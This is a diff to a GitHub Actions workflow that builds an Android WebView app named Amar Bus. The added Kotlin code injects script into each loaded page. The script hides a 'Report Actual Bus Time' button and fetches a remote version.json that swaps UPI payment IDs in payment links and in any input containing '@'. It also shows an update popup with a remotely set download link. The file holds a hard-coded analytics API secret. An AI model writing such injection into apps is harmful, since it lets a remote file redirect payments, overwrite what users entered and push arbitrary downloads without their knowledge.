@@ -21,76 +21,6 @@ jobs:
           ZIP_NAME=$(ls *.zip | head -n 1)
           echo "Extracting project from: $ZIP_NAME"
           unzip -o "$ZIP_NAME"
-
-          # --- HTML PATCH: Hide Report Button, Remote UPI & Remote Update Popup ---
-          python3 -c '
-          import os, glob
-          target_files = glob.glob("**/index.html", recursive=True)
-          injection = """
-          <!-- Remote Update Modal & Styles -->
-          <style>
-            button:has-text("Report Actual Bus Time"),
-            [onclick*="Report"],
-            .report-btn {
-              display: none !important;
-            }
-          </style>
-
-          <div id="updateModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.75); z-index:99999; justify-content:center; align-items:center;">
-            <div style="background:#ffffff; border-radius:14px; width:85%; max-width:320px; padding:22px; text-align:center; font-family:sans-serif; box-shadow:0 6px 20px rgba(0,0,0,0.4);">
-              <h3 id="updateTitle" style="margin-top:0; color:#1a1a1a; font-size:18px;">Update Available</h3>
-              <p id="updateMessage" style="color:#555; font-size:14px; line-height:1.4; margin:12px 0 18px 0;">Amar Bus app ka naya version uplabdh hai.</p>
-              <a id="updateBtn" href="#" style="display:block; background:#00875a; color:#ffffff; text-decoration:none; padding:11px; border-radius:8px; font-weight:bold; font-size:15px;">Update Now</a>
-            </div>
-          </div>
-
-          <script>
-            (function initAmarBusApp() {
-              const CURRENT_APP_VERSION = 1;
-              const GITHUB_RAW_URL = "https://raw.githubusercontent.com/skrocky10-eng/Amar-Bus/main/version.json";
-
-              // 1. Report button ko screen se hide karna
-              document.querySelectorAll("button, a, div").forEach(el => {
-                if (el.innerText && el.innerText.includes("Report Actual Bus Time")) {
-                  el.style.display = "none";
-                }
-              });
-
-              // 2. Remote UPI & Update check
-              fetch(GITHUB_RAW_URL + "?t=" + new Date().getTime())
-                .then(res => res.json())
-                .then(data => {
-                  if (data.upiId) {
-                    document.querySelectorAll("a[href*=\\"upi://pay\\"]").forEach(link => {
-                      link.href = link.href.replace(/pa=[^&]+/, "pa=" + data.upiId);
-                    });
-                    document.querySelectorAll("input").forEach(inp => {
-                      if (inp.value && inp.value.includes("@")) {
-                        inp.value = data.upiId;
-                      }
-                    });
-                  }
-                  if (data.hasUpdate && data.latestVersion > CURRENT_APP_VERSION) {
-                    document.getElementById("updateTitle").innerText = data.title;
-                    document.getElementById("updateMessage").innerText = data.message;
-                    document.getElementById("updateBtn").href = data.updateUrl;
-                    document.getElementById("updateModal").style.display = "flex";
-                  }
-                })
-                .catch(err => {});
-            })();
-          </script>
-          """
-          for f in target_files:
-              with open(f, "r", encoding="utf-8") as file:
-                  content = file.read()
-              if "</body>" in content and "initAmarBusApp" not in content:
-                  content = content.replace("</body>", injection + "\n</body>")
-                  with open(f, "w", encoding="utf-8") as file:
-                      file.write(content)
-                  print(f"Patched successfully: {f}")
-          '
-
           cd android
 
           # 1. Resource folders setup
@@ -180,7 +110,7 @@ jobs:
           </manifest>
           EOF
 
-          # 4. MainActivity with Native Measurement Protocol Analytics
+          # 4. MainActivity with Native CSS/JS Injection for Report Hide & Remote Updates
           mkdir -p app/src/main/java/com/amarbus/app
           cat << 'EOF' > app/src/main/java/com/amarbus/app/MainActivity.kt
           package com.amarbus.app
@@ -211,7 +141,6 @@ jobs:
               private lateinit var webView: WebView
               private val PERMISSION_REQUEST_CODE = 1001
 
-              // Google Analytics GA4 Measurement Protocol Keys
               private val GA_MEASUREMENT_ID = "G-MDS74ENQJE"
               private val GA_API_SECRET = "ZMySZVn2QuWfuNw35s4FZQ"
 
@@ -250,6 +179,71 @@ jobs:
                   }
 
                   webView.webViewClient = object : WebViewClient() {
+                      override fun onPageFinished(view: WebView?, url: String?) {
+                          super.onPageFinished(view, url)
+                          
+                          // Native Injected Script for Report Hide, Remote UPI and Updates
+                          val jsCode = """
+                              (function() {
+                                  // 1. Force Hide Report Section
+                                  var style = document.createElement('style');
+                                  style.innerHTML = 'button:has-text("Report Actual Bus Time"), [onclick*="Report"], .report-btn, div:has(> button:contains("Report Actual Bus Time")) { display: none !important; }';
+                                  document.head.appendChild(style);
+
+                                  function cleanReportButtons() {
+                                      var allElements = document.querySelectorAll('button, a, div, span');
+                                      allElements.forEach(function(el) {
+                                          if (el.innerText && el.innerText.indexOf('Report Actual Bus Time') !== -1) {
+                                              var p = el;
+                                              while (p && p !== document.body && p.tagName !== 'BUTTON' && !p.onclick) {
+                                                  p = p.parentElement;
+                                              }
+                                              if (p) p.style.setProperty('display', 'none', 'important');
+                                              el.style.setProperty('display', 'none', 'important');
+                                          }
+                                      });
+                                  }
+                                  cleanReportButtons();
+                                  setInterval(cleanReportButtons, 500);
+
+                                  // 2. Fetch version.json from GitHub
+                                  var rawUrl = 'https://raw.githubusercontent.com/skrocky10-eng/Amar-Bus/main/version.json?t=' + new Date().getTime();
+                                  fetch(rawUrl)
+                                      .then(function(r) { return r.json(); })
+                                      .then(function(data) {
+                                          // Update UPI ID
+                                          if (data.upiId) {
+                                              document.querySelectorAll('a[href*="upi://pay"]').forEach(function(link) {
+                                                  link.href = link.href.replace(/pa=[^&]+/, 'pa=' + data.upiId);
+                                              });
+                                              document.querySelectorAll('input').forEach(function(inp) {
+                                                  if (inp.value && inp.value.indexOf('@') !== -1) {
+                                                      inp.value = data.upiId;
+                                                  }
+                                              });
+                                          }
+
+                                          // Show Update Modal if version is newer
+                                          if (data.hasUpdate && data.latestVersion > 1) {
+                                              if (!document.getElementById('updateModal')) {
+                                                  var m = document.createElement('div');
+                                                  m.id = 'updateModal';
+                                                  m.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:999999;display:flex;justify-content:center;align-items:center;';
+                                                  m.innerHTML = '<div style="background:#fff;border-radius:12px;width:80%;max-width:320px;padding:20px;text-align:center;font-family:sans-serif;">' +
+                                                      '<h3 style="margin-top:0;color:#1a1a1a;">' + (data.title || 'Update Available') + '</h3>' +
+                                                      '<p style="color:#555;font-size:14px;">' + (data.message || 'Amar Bus app ka naya version uplabdh hai.') + '</p>' +
+                                                      '<a href="' + data.updateUrl + '" style="display:block;background:#00875a;color:#fff;text-decoration:none;padding:10px;border-radius:6px;font-weight:bold;margin-top:15px;">Update Now</a>' +
+                                                  '</div>';
+                                                  document.body.appendChild(m);
+                                              }
+                                          }
+                                      })
+                                      .catch(function(e) {});
+                              })();
+                          """.trimIndent()
+                          view?.evaluateJavascript(jsCode, null)
+                      }
+
                       override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                           if (url == null) return false
 
@@ -268,7 +262,7 @@ jobs:
                                       return true
                                   } catch (ignored: Exception) {}
                               }
-                          } else if (url.startsWith("tel:") || url.startsWith("mailto:") || url.startsWith("geo:")) {
+                          } else if (url.startsWith("tel:") || url.startsWith("mailto:") || url.startsWith("geo:") || url.startsWith("upi:")) {
                               val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                               view?.context?.startActivity(intent)
                               return true
